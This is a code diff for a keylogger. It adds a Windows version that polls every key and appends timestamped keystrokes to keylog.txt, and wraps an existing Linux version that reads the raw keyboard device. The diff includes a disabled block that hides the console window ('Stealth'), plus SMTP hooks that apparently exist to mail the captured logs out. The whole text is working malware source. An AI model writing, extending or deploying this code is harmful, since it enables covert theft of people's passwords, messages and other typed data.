@@ -1,28 +1,81 @@
+#ifdef _WIN32
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <winuser.h>
+#include <time.h>
+
+using namespace std;
+
+bool log(int key_stroke);
+
+int main()
+{
+   int i;
+   bool run = true;
+
+   if(false)
+   {
+      HWND Stealth;
+      AllocConsole();
+      Stealth = FindWindowA("ConsoleWindowClass", NULL);
+      ShowWindow(Stealth,0);
+   }
+
+   while(run)
+   {
+      for(i = 8; i <= 190; i++)
+      {
+         if(GetAsyncKeyState(i) == -32767)
+         {
+            run = log(i);
+         }
+      }
+   }
+
+   //main_smtp();
+   return 0;
+}
+
+bool log(int key_stroke)
+{
+   if((key_stroke == 1) || (key_stroke == 2))
+   {
+      return true;
+   }
+
+   FILE* myFile = fopen("keylog.txt", "a+");
+   time_t rawtime;
+   time (&rawtime);
+
+   printf("(%lu) %d=%d\n", rawtime, key_stroke, key_stroke);
+
+   if(key_stroke == VK_ESCAPE)
+   {
+      return false;
+   }else
+   {
+      fprintf(myFile,"(%lu) %d=%d\n", rawtime, key_stroke, key_stroke);
+      fclose(myFile);
+      return true;
+   }
+}
+#endif
+
+#ifdef __linux
 #include <fcntl.h>
 //using open;
-
 #include <unistd.h>
-
 #include <string>
 using std::string;
-
 #include "linux_keyrecord.h"
 //#include "keydb.h"
 #include "keytxt.h"
 #include "keyrecord.h"
 #include "keyvalue.h"
 using namespace keylog;
-
 #include "smtp-attach.h"
 
-
-/*
-	TODO:
-		- determine when to write to db file (vs keeping keyrecords in memory)
-		- implement threading on the device file reader?
-		- get keyboard device file for any machine
-		- user determination of db filename/location
-*/
 
 int main() {
 
@@ -42,8 +95,6 @@ int main() {
 
 	struct input_event event;
 
-#ifdef __linux__
-#endif
     bool running = true;
 	while(running) {
         read(device_file, &event, sizeof(struct input_event));
@@ -75,3 +126,4 @@ int main() {
 
 	close(device_file);
 }
+#endif
